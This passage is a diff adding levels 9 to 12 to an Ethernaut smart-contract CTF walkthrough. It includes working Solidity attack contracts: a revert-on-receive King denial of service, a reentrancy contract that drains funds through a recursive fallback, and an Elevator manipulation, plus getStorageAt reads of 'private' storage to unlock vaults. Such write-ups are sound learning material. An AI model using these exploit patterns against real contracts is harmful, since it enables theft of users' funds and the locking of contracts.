@@ -115,4 +115,90 @@ Looking at the code, we can see that the 'bytes32 private password' is not priva
 The key word private means that this variable can only be called by this smart contract. It's doesn't mean that no one can read it.
 In the console, I can simply call 'const pass = await web3.eth.getStorageAt(instance, 1)' to get what is being stored in the 2nd memory slot of the instance contract address. I get '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' in response, which is the bytes32 password. I can then call 'contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")' and the vault is unlocked.
 
+## Lvl-9 King
+The contract sends the prize to the old king when a new king is being crowned.
+So if we claim kingship with a contract that doesn't accept eth payement, the second line of the receive() function, 'king.transfer(msg.value);' will fail. 
+```
+pragma solidity ^0.6.0;
+
+contract KingForEver {
+
+    function claimKingship(address payable target) payable public {
+        target.call.value(1 ether).gas(1000000)("");
+    }
+
+    receive() external payable {
+        revert();
+    }
+}
+```
+And since ethereum transaction are atomic, all of the tx will fail and a new king will never be crowned. We are now king for ever.
+Note: had to increase the gas in metamask manually.
+
+## Lvl-10 Reentrancy
+This level wants us to perform a reentrancy attack like what happened with the DAO in 2016.
+First you have to have you attack smart contract send some eth to create a balance on the targeted contract, then have your attack SC call the withdraw() function of the target and make it so that the fallback() function of the attack SC calls the withdraw() function again, so that the funds are drained before the balance of the attacking SC is reduced.
+```
+contract ReentrancyAttack {
+    Reentrance target;
+    uint donationStarter;
+
+    constructor(address payable _target) public payable {
+        target = Reentrance(_target);
+        donationStarter = msg.value;
+        target.donate.value(msg.value)(address(this));
+    }
+
+    function reentracyAttack() public {
+        target.withdraw(donationStarter);
+    }
+    // To get your eth back
+    function withdraw() public {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    fallback() external payable {
+        reentracyAttack();
+    }
+}
+```
+## Lvl-11 Elevator
+The Elevator contract call the function 'isLastFloor()' of the building contract twice, so we just have to make a contract that sends false the first time isLastFloor() is called and true the second time the function is called and we will have achieve to set the boolean 'top' from the Elevator contract to 'true'
+```
+pragma solidity 0.6.0;
+
+contract callElevator {
+
+    Elevator elevator;
+    bool calledYet = false;
+
+    constructor(address target) public {
+        elevator = Elevator(target);
+    }
+
+    function reachLastFloor(uint floor) public {
+        elevator.goTo(floor);
+    }
+
+    function isLastFloor(uint floor) public returns(bool){
+        if (!calledYet) {
+            calledYet = true;
+            return(false);
+        }
+        else {
+            return(true);
+        }
+    }
+}
+```
+
+## Lvl-12 Private
+The contract has some private variable, but the blockchain is transparent, so we can easily go read those 'private' variables by doing 'await web3.eth.getStorageAt(instance, 5)' in the console which gives us back '0xcaad0e9d0eac5ecbd328a0db25cf5ad437a7cc320739cbdea8e1848c11c4d342', which is the bytes32. But we need the bytes16 version of this so we can make a SC that does
+```
+contract Convert {
+    bytes16 public pass = bytes16(bytes32(0xcaad0e9d0eac5ecbd328a0db25cf5ad437a7cc320739cbdea8e1848c11c4d342));
+}
+```
+to know what the bytes16 version of it is.
+Then simply call the unlock() function of the private contract with the bytes16 key and voila, the contract is unlocked.
 
